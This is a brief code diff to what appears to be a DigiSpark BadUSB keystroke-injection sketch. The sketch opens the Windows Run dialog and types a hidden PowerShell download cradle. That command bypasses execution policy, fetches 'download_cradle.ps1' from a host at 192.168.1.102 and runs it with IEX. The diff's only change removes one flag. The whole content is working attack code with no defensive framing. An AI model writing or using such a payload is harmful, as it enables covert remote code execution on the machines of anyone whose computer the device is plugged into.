@@ -24,7 +24,7 @@ void setup() {
   // Run payload in background
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX");
+  DigiKeyboard.print("powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -WindowStyle Hidden (New-Object system.net.webclient).downloadstring('http://192.168.1.102/download_cradle.ps1') | IEX");
   DigiKeyboard.delay(200);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(300);
